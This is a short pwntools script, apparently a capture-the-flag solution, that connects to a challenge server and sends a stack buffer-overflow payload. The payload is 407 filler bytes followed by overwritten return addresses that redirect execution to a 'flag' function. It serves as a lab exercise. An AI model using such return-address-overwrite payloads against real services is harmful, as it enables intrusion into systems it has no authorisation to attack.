from pwn import *

r = remote("challenge.ctf.games", 31463)

flag = 0x00000000004012e9
retcheck = 0x401465
payload = "1"*407+"\r"+p64(retcheck)+"66666666"+p64(flag)

r.sendline(payload)

r.interactive()